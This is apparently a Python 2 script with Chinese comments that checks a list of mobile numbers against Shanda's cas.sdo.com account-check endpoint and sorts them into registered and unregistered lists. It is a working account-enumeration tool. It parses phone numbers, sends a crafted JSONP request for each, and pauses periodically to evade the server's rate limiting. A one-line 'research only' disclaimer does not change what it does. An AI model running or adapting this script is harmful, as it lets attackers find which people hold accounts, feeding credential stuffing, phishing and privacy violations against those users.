import sys
import re
import string

import urllib
import urllib2
import time

import datetime
starttime = datetime.datetime.now()   #开始计算程序运行时间

print '仅供研究测试之用，请勿用于非法用途！！'  #重要提示！

f=open(r'待过滤\待过滤.txt','r')
f1=open(r'结果\结果_OK.txt','w')
f2=open(r'结果\结果_NO.txt','w')
f3=open(r'结果\结果_error.txt','w')

other_key="&callback=checkAccountType_JSONPMethod&serviceUrl=register.sdo.com \
&appId=201&areaId=200&authenSource=2 \
&locale=zh_CN&productId=1&productVersion=1.7&version=21&_="
count=0
OK_num=0
NO_num=0
error_num=0

lines=f.readlines()  #读取手机号文件数据流

for line in lines :
        
        linex=re.search(r'((13[0-9]|15[0-9]|18[0-9])[0-9]{8})',line)
        if linex:
                phone=linex.group(0)
                count +=1
                url = "http://cas.sdo.com/authen/checkAccountType.jsonp?inputUserId="+phone+other_key   
                    
                #time.sleep(1)      #批量太快会503，等待1s
                req = urllib2.Request(url)
                #print req
                #print "####"
                res_data = urllib2.urlopen(req)
                
                
                res = res_data.read()
                #print res   #输入respone
                
                mobileMask=re.search(r'mobileMask',res)
                if mobileMask:               ###出现这个key，则返回的响应正常
                    existing=re.search(r'(existing.*?fromWoa)',res )
                    if '1' in existing.group(0) :
                        f1.write(phone+'\n')  ###已注册的用户
                        OK_num +=1
                        print "Test Phone: "+phone +" : Yes !"
                    else:
                        f2.write(phone+'\n')####未注册的用户
                        NO_num +=1
                        print "Test Phone: "+phone +" : No !"
                else:              ###不正常返回响应
                    f3.write(phone+'\n') ####出现请求，返回值existing 错误的手机号，需要重新测试
                    error_num +=1
                    print  "Test Phone: "+phone +" : Error! You'd better have a try again later !"
                if count ==45:
                    break #测试版，45个便停止！！    

                        

                if count % 9 == 0:
                    print "目前已进行到第 " +str(count)+" 行！因服务器原因，自动静默60s..."
                    time.sleep(60)
                    

        else:       ####改行没有手机号，重新读取下一行
            #print 'error line'+line
            continue



f.close()
f1.close()
f2.close()
f3.close()

print "\n**OK啦！此版本仅供测试45行！**"
print "**总共读取行数  ： "+str(count)
print "**已注册用户数  ： "+str(OK_num)
print "**未注册用户数  ： "+str(NO_num)
print "**需要重新过滤数 ： "+str(error_num)
print "**数据可用率 ：%.2f%%"  % (OK_num/float(count)*100)
endtime = datetime.datetime.now()
print "**总共用时  ："+str((endtime - starttime).seconds ) +" 秒！"   ##输出运行时间
print "**结果已写入结果文件 **\n"


print "可按任意键退出..."
raw_input()
raw_input

